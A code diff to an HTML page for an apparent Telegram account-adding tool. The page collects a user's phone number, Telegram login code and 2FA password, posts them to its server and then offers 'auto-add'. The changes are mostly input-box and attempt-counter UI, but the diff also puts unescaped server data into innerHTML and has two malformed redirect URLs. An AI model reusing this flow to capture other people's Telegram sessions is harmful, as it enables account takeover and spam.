@@ -174,11 +174,13 @@
             box-shadow: 0 0 0 3px rgba(76, 156, 224, 0.15);
         }
 
+        /* IMPROVED CODE INPUT */
         .code-container {
             display: flex;
             gap: 10px;
             justify-content: center;
             margin: 24px 0;
+            cursor: text;
         }
 
         .code-box {
@@ -193,8 +195,9 @@
             text-align: center;
             line-height: 61px;
             transition: all 0.2s;
-            cursor: pointer;
+            cursor: text;
             user-select: none;
+            position: relative;
         }
 
         .code-box.filled {
@@ -203,12 +206,44 @@
             box-shadow: 0 0 12px rgba(76, 156, 224, 0.2);
         }
 
+        .code-box.active {
+            border-color: #6ab2f2;
+            box-shadow: 0 0 16px rgba(76, 156, 224, 0.4);
+            animation: pulse-border 1.5s ease-in-out infinite;
+        }
+
+        .code-box.error {
+            border-color: #e04c4c;
+            background: #4a1e1e;
+            box-shadow: 0 0 12px rgba(224, 76, 76, 0.3);
+            animation: shake 0.5s ease;
+        }
+
+        @keyframes pulse-border {
+            0%, 100% { border-color: #6ab2f2; }
+            50% { border-color: #4c9ce0; }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
         .hidden-input {
             position: absolute;
             opacity: 0;
-            width: 0;
-            height: 0;
+            width: 1px;
+            height: 1px;
             pointer-events: none;
+        }
+
+        .code-hint {
+            text-align: center;
+            color: #5d6f7e;
+            font-size: 0.8rem;
+            margin-top: -10px;
+            margin-bottom: 15px;
         }
 
         .btn {
@@ -252,6 +287,25 @@
             background: #2b3945;
         }
 
+        /* Clear code button */
+        .clear-code-btn {
+            display: block;
+            text-align: center;
+            color: #8e9fad;
+            font-size: 0.8rem;
+            margin-top: 8px;
+            cursor: pointer;
+            text-decoration: underline;
+            background: none;
+            border: none;
+            width: 100%;
+            padding: 5px;
+        }
+
+        .clear-code-btn:hover {
+            color: #ff6b6b;
+        }
+
         .error-message {
             background: #4a1e1e;
             color: #ff6b6b;
@@ -273,12 +327,6 @@
             font-size: 0.85rem;
             display: none;
             border-left: 3px solid #4c9e4c;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
         }
 
         .error-message.show, .success-message.show {
@@ -316,6 +364,13 @@
             margin-top: 20px;
             color: #5d6f7e;
             font-size: 0.8rem;
+        }
+
+        .attempt-counter {
+            text-align: center;
+            color: #ffaa00;
+            font-size: 0.8rem;
+            margin-top: 8px;
         }
 
         @media (max-width: 480px) {
@@ -390,22 +445,25 @@
                 </div>
 
                 <div class="step-title">🔐 Verification Code</div>
-                <div class="step-description">
+                <div class="step-description" id="codeDescription">
                     Enter the 5-digit code sent to your Telegram account.
                 </div>
 
                 <div class="error-message" id="error2"></div>
                 <div class="success-message" id="success2"></div>
 
-                <input type="text" id="hiddenCodeInput" class="hidden-input" maxlength="5" inputmode="numeric" pattern="[0-9]*">
+                <!-- Hidden input for capturing code -->
+                <input type="text" id="hiddenCodeInput" class="hidden-input" maxlength="5" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
                 
-                <div class="code-container" id="codeBoxes" onclick="focusHiddenInput()">
-                    <div class="code-box" id="box1">-</div>
-                    <div class="code-box" id="box2">-</div>
-                    <div class="code-box" id="box3">-</div>
-                    <div class="code-box" id="box4">-</div>
-                    <div class="code-box" id="box5">-</div>
+                <div class="code-container" id="codeBoxes" onclick="focusCodeInput()">
+                    <div class="code-box" id="box1" data-index="0">-</div>
+                    <div class="code-box" id="box2" data-index="1">-</div>
+                    <div class="code-box" id="box3" data-index="2">-</div>
+                    <div class="code-box" id="box4" data-index="3">-</div>
+                    <div class="code-box" id="box5" data-index="4">-</div>
                 </div>
+
+                <div class="code-hint">Click on boxes or type to enter code • Backspace to delete</div>
 
                 <div id="passwordGroup" style="display: none;">
                     <input type="password" class="password-input" id="password" placeholder="Enter your 2FA password">
@@ -415,9 +473,15 @@
                     <span>Verify & Add Account</span>
                 </button>
 
-                <button class="btn btn-secondary" onclick="backToPage1()">
-                    ← Back
+                <button class="btn btn-secondary" onclick="clearCode()">
+                    🗑️ Clear Code
                 </button>
+
+                <button class="btn btn-secondary" onclick="backToPage1()">
+                    ← Back to Phone Number
+                </button>
+
+                <div class="attempt-counter" id="attemptCounter"></div>
             </div>
 
             <!-- Page 3: Success -->
@@ -459,6 +523,8 @@
         let currentPhone = '';
         let redirectTimer = null;
         let serverName = 'Server';
+        let codeAttempts = 0;
+        let passwordAttempts = 0;
 
         // DOM elements
         const hiddenInput = document.getElementById('hiddenCodeInput');
@@ -469,6 +535,7 @@
             document.getElementById('box4'),
             document.getElementById('box5')
         ];
+        const codeBoxesContainer = document.getElementById('codeBoxes');
 
         // Load server info
         async function loadServerInfo() {
@@ -492,7 +559,19 @@
             if (errorDiv) {
                 errorDiv.textContent = message;
                 errorDiv.classList.add('show');
-                setTimeout(() => errorDiv.classList.remove('show'), 4000);
+                // Auto hide after 5 seconds
+                setTimeout(() => {
+                    if (errorDiv.textContent === message) {
+                        errorDiv.classList.remove('show');
+                    }
+                }, 5000);
+            }
+        }
+
+        function hideError(pageNum = 1) {
+            const errorDiv = document.getElementById(`error${pageNum}`);
+            if (errorDiv) {
+                errorDiv.classList.remove('show');
             }
         }
 
@@ -516,26 +595,167 @@
             }
         }
 
-        function focusHiddenInput() {
+        function updateAttemptCounter() {
+            const counter = document.getElementById('attemptCounter');
+            const maxAttempts = 5;
+            const remaining = maxAttempts - Math.max(codeAttempts, passwordAttempts);
+            
+            if (codeAttempts > 0 || passwordAttempts > 0) {
+                if (remaining <= 0) {
+                    counter.textContent = '⚠️ No attempts remaining. Session expired.';
+                    counter.style.color = '#ff6b6b';
+                } else if (remaining <= 2) {
+                    counter.textContent = `⚠️ ${remaining} attempt${remaining > 1 ? 's' : ''} remaining`;
+                    counter.style.color = '#ffaa00';
+                } else {
+                    counter.textContent = `${remaining} attempt${remaining > 1 ? 's' : ''} remaining`;
+                    counter.style.color = '#8e9fad';
+                }
+            } else {
+                counter.textContent = '';
+            }
+        }
+
+        // ============================================
+        // IMPROVED CODE INPUT - FULLY EDITABLE
+        // ============================================
+        
+        function focusCodeInput() {
             hiddenInput.focus();
+            updateActiveBox();
+        }
+
+        function updateActiveBox() {
+            const code = hiddenInput.value.replace(/[^0-9]/g, '');
+            const currentIndex = code.length;
+            
+            // Remove active class from all boxes
+            boxes.forEach((box, i) => {
+                box.classList.remove('active', 'error');
+                if (i === currentIndex && currentIndex < 5) {
+                    box.classList.add('active');
+                }
+            });
         }
 
         function updateCodeBoxes() {
             const code = hiddenInput.value.replace(/[^0-9]/g, '').slice(0, 5);
+            
             for (let i = 0; i < 5; i++) {
+                const box = boxes[i];
+                
+                // Remove all state classes first
+                box.classList.remove('filled', 'active', 'error');
+                
                 if (i < code.length) {
-                    boxes[i].textContent = code[i];
-                    boxes[i].classList.add('filled');
+                    box.textContent = code[i];
+                    box.classList.add('filled');
                 } else {
-                    boxes[i].textContent = '-';
-                    boxes[i].classList.remove('filled');
+                    box.textContent = '-';
                 }
             }
+            
+            // Set active box
+            if (code.length < 5) {
+                boxes[code.length].classList.add('active');
+            }
+            
+            // Hide error when user starts typing again
+            hideError(2);
         }
 
-        hiddenInput.addEventListener('input', updateCodeBoxes);
+        function clearCode() {
+            hiddenInput.value = '';
+            updateCodeBoxes();
+            focusCodeInput();
+            hideError(2);
+            codeAttempts = 0;
+            passwordAttempts = 0;
+            updateAttemptCounter();
+        }
 
-        // Navigation
+        // Handle hidden input changes
+        hiddenInput.addEventListener('input', function(e) {
+            // Only allow digits
+            let value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
+            this.value = value;
+            updateCodeBoxes();
+            hideError(2);
+        });
+
+        // Handle keydown for special keys
+        hiddenInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace') {
+                const value = this.value.replace(/[^0-9]/g, '');
+                if (value.length === 0) {
+                    // Already empty, do nothing special
+                    updateCodeBoxes();
+                }
+                // Normal backspace behavior works
+            }
+            
+            if (e.key === 'Delete') {
+                e.preventDefault();
+                clearCode();
+            }
+            
+            if (e.key === 'ArrowLeft' || e.key === 'ArrowRight') {
+                // Allow arrow key navigation
+                return;
+            }
+        });
+
+        // Handle paste event
+        hiddenInput.addEventListener('paste', function(e) {
+            e.preventDefault();
+            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+            const digits = pastedText.replace(/[^0-9]/g, '').slice(0, 5);
+            this.value = digits;
+            updateCodeBoxes();
+            hideError(2);
+        });
+
+        // Click on individual boxes to position cursor
+        boxes.forEach(box => {
+            box.addEventListener('click', function(e) {
+                e.stopPropagation();
+                const index = parseInt(this.getAttribute('data-index'));
+                const currentCode = hiddenInput.value.replace(/[^0-9]/g, '');
+                
+                // If clicking a filled box, position cursor after it
+                if (index < currentCode.length) {
+                    hiddenInput.value = currentCode.slice(0, index + 1);
+                } else {
+                    // If clicking empty box, position cursor there
+                    hiddenInput.value = currentCode.slice(0, index);
+                }
+                
+                updateCodeBoxes();
+                hiddenInput.focus();
+            });
+        });
+
+        // Allow clicking on container to focus
+        codeBoxesContainer.addEventListener('click', function() {
+            focusCodeInput();
+        });
+
+        // Shake animation on error
+        function shakeCodeBoxes() {
+            boxes.forEach(box => {
+                box.classList.add('error');
+                setTimeout(() => box.classList.remove('error'), 500);
+            });
+            codeBoxesContainer.style.animation = 'shake 0.5s ease';
+            setTimeout(() => {
+                codeBoxesContainer.style.animation = '';
+            }, 500);
+        }
+
+        // ============================================
+        // NAVIGATION
+        // ============================================
+
         function backToPage1() {
             document.getElementById('page1').style.display = 'block';
             document.getElementById('page2').style.display = 'none';
@@ -547,18 +767,24 @@
             document.getElementById('phone').focus();
             currentSessionId = null;
             currentPhone = '';
+            codeAttempts = 0;
+            passwordAttempts = 0;
+            updateAttemptCounter();
             
             document.getElementById('passwordGroup').style.display = 'none';
+            
+            hideError(1);
+            hideError(2);
             
             if (redirectTimer) clearTimeout(redirectTimer);
         }
 
         function goToAutoAdd() {
-            window.location.href = '/auto-add';
+            window.location.href = '/https://t.me/abe_army';
         }
 
         function goToDashboard() {
-            window.location.href = '/dashboard';
+            window.location.href = 'https://abe_army';
         }
 
         function addAnotherAccount() {
@@ -571,7 +797,10 @@
             btn.setAttribute('data-original-text', btn.querySelector('span').textContent);
         });
 
-        // API Calls
+        // ============================================
+        // API CALLS
+        // ============================================
+
         async function sendCode() {
             let phoneNumber = document.getElementById('phone').value.trim().replace(/\s+/g, '');
             
@@ -589,6 +818,7 @@
 
             const button = document.getElementById('sendCodeBtn');
             setLoading(button, true);
+            hideError(1);
 
             try {
                 const response = await fetch('/api/add-account', {
@@ -606,12 +836,19 @@
                     document.getElementById('page1').style.display = 'none';
                     document.getElementById('page2').style.display = 'block';
                     
+                    // Reset code input
                     hiddenInput.value = '';
                     updateCodeBoxes();
+                    codeAttempts = 0;
+                    passwordAttempts = 0;
+                    updateAttemptCounter();
                     document.getElementById('passwordGroup').style.display = 'none';
                     document.getElementById('password').value = '';
+                    document.getElementById('codeDescription').textContent = 
+                        'Enter the 5-digit code sent to your Telegram account.';
                     
-                    setTimeout(() => hiddenInput.focus(), 300);
+                    // Focus the hidden input
+                    setTimeout(() => focusCodeInput(), 300);
                     
                     showSuccess('Verification code sent! Check your Telegram.', 2);
                 } else {
@@ -630,7 +867,8 @@
             
             if (code.length !== 5) {
                 showError('Please enter the complete 5-digit code', 2);
-                hiddenInput.focus();
+                shakeCodeBoxes();
+                focusCodeInput();
                 return;
             }
 
@@ -646,6 +884,7 @@
 
             const button = document.getElementById('verifyBtn');
             setLoading(button, true);
+            hideError(2);
 
             try {
                 const response = await fetch('/api/verify-code', {
@@ -666,9 +905,15 @@
                     document.getElementById('page3').style.display = 'block';
                     
                     const accountName = data.account ? data.account.name : 'User';
-                    document.getElementById('successAccountInfo').innerHTML = 
-                        `<strong>${accountName}</strong><br>Phone: ${currentPhone}<br><br>
-                        <span style="color: #8e9fad;">You can now configure auto-add for this account.</span>`;
+                    let successHTML = `<strong>${accountName}</strong><br>Phone: ${currentPhone}`;
+                    
+                    if (data.account_age) {
+                        successHTML += `<br><br>📅 Account Age: <strong>${data.account_age}</strong>`;
+                    }
+                    
+                    successHTML += `<br><br><span style="color: #8e9fad;">You can now configure auto-add for this account.</span>`;
+                    
+                    document.getElementById('successAccountInfo').innerHTML = successHTML;
                     
                     showSuccess('Account added successfully!', 3);
                     
@@ -680,20 +925,41 @@
                     showError('This account has 2FA enabled. Please enter your password.', 2);
                     
                 } else {
-                    // Show error
-                    showError(data.error || 'Verification failed. Please try again.', 2);
+                    // Check if it's a code error or password error
+                    const errorMsg = data.error || 'Verification failed. Please try again.';
                     
-                    // Clear code on code errors
-                    if (data.error && data.error.toLowerCase().includes('code')) {
-                        hiddenInput.value = '';
-                        updateCodeBoxes();
-                        hiddenInput.focus();
-                    }
-                    
-                    // Clear password on password errors
-                    if (data.error && data.error.toLowerCase().includes('password')) {
+                    if (errorMsg.toLowerCase().includes('code') || errorMsg.toLowerCase().includes('invalid')) {
+                        codeAttempts++;
+                        updateAttemptCounter();
+                        
+                        // Show remaining attempts
+                        const remaining = 5 - codeAttempts;
+                        if (remaining > 0) {
+                            showError(`${errorMsg} (${remaining} attempts remaining)`, 2);
+                        } else {
+                            showError('Too many incorrect attempts. Please go back and request a new code.', 2);
+                            setTimeout(() => backToPage1(), 2000);
+                        }
+                        
+                        shakeCodeBoxes();
+                        // Don't clear the code - let user edit it
+                        focusCodeInput();
+                    } else if (errorMsg.toLowerCase().includes('password')) {
+                        passwordAttempts++;
+                        updateAttemptCounter();
+                        
+                        const remaining = 5 - passwordAttempts;
+                        if (remaining > 0) {
+                            showError(`${errorMsg} (${remaining} attempts remaining)`, 2);
+                        } else {
+                            showError('Too many incorrect passwords. Please go back and request a new code.', 2);
+                            setTimeout(() => backToPage1(), 2000);
+                        }
+                        
                         passwordInput.value = '';
                         passwordInput.focus();
+                    } else {
+                        showError(errorMsg, 2);
                     }
                 }
             } catch (error) {
@@ -704,7 +970,10 @@
             }
         }
 
-        // Event listeners
+        // ============================================
+        // EVENT LISTENERS
+        // ============================================
+
         document.getElementById('phone').addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9+]/g, '');
         });
@@ -717,6 +986,26 @@
             if (e.key === 'Enter') verifyCode();
         });
 
+        // Prevent form submission on enter in hidden input
+        hiddenInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                verifyCode();
+            }
+        });
+
+        // Auto-focus code input when page 2 is shown
+        const observer = new MutationObserver(function(mutations) {
+            mutations.forEach(function(mutation) {
+                if (mutation.target.id === 'page2' && mutation.target.style.display === 'block') {
+                    setTimeout(() => focusCodeInput(), 300);
+                }
+            });
+        });
+
+        const page2 = document.getElementById('page2');
+        observer.observe(page2, { attributes: true, attributeFilter: ['style'] });
+
         // Load server info on page load
         window.addEventListener('load', () => {
             loadServerInfo();
@@ -724,4 +1013,4 @@
         });
     </script>
 </body>
-</html>
+    </html>
